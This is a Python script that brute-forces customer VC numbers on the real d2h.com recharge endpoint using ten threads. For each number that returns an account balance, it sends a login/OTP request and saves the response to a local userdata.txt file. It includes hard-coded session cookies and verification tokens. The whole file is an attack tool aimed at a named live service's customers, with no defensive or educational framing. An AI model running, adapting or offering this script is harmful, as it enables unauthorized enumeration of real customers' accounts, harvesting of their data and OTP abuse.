import requests
from concurrent.futures import ThreadPoolExecutor

# Set the target URL and the initial headers
url = "https://www.d2h.com/quick-recharge/details"
login_url = "https://www.d2h.com/user-login"  # URL for user login
headers = {
    "Cookie": "ApplicationGatewayAffinityCORS=ef97db6fb831849b3b21384f4d5e50f7; ApplicationGatewayAffinity=9053db6fb831849b3b21384f4d5e50f7; ASP.NET_SessionId=gpdc2gcjx0cu4124bhpobczm; __RequestVerificationToken=UV6xKmlmpEtZOHujfZqeyxEy72iNH8RcqogexcKXjxHHVtRaNzUWKn3mQH-Fzs3rzY5MoHAYCA2DTh0OX8dw2bWQXlkwDy4VJgQFnlv6D1I1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
}

# Function to send a request with a specific vcno value
def check_vcno(vcno_value):
    data = {
        "cusPhone": "",
        "cusId": "",
        "vcno": vcno_value
    }
    response = requests.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        # Check if "Account Balance:" is in the response text
        if "Account Balance:" in response.text:
            print(f"Account information found for vcno={vcno_value}")
            # Call the function to get more details about the account
            get_account_details(vcno_value)
        else:
            pass

# Function to get account details using the found vcno
def get_account_details(vcno_value):
    # Prepare the payload for the login request
    data = {
        "InputType": "VCNo",
        "Password": "",  # Leave blank as per your original request
        "UserInput": vcno_value,  # Set the found vcno as UserInput
        "returnurl": "/recharge/pay-later",
        "RequestType": "otp",  # Request type for OTP validation
        "VCNo": "",  # Empty as per your structure
        "rememberMe": "false",
        "__RequestVerificationToken": "VnepU3bAhMRn9ufLVeAHgqSk8ZXUTf0mDCvZyG5l2ctrzHFttwEgo8yjzkGI6GT05xJ8n3cLTisBzjjq1ZyfulsPvgoqlqE3nU3KhPtBDz41"  # Use your valid token here
    }

    detail_response = requests.post(login_url, headers=headers, data=data)

    if detail_response.status_code == 200:
        # Write the response to userdata.txt
        with open('userdata.txt', 'a') as file:  # Open in append mode
            file.write(f"Response for vcno={vcno_value}: {detail_response.text}\n")
    else:
        print(f"Failed to retrieve details for vcno={vcno_value}, status code: {detail_response.status_code}")

# Brute-force a range of vcno numbers using threads
def brute_force_vcnos(start_vcno, end_vcno):
    with ThreadPoolExecutor(max_workers=10) as executor:  # Use 10 threads
        # Submit tasks to the executor for each vcno in the range
        for vcno in range(start_vcno, end_vcno):
            formatted_vcno = str(vcno).zfill(11)  # Ensures 11 digits with leading zeros if necessary
            executor.submit(check_vcno, formatted_vcno)

# Define the start and end of the vcno range
start_vcno = 2900254800
end_vcno = 2900254900  # Adjust this range as necessary

# Start brute-forcing
if __name__ == "__main__":
    brute_force_vcnos(start_vcno, end_vcno)
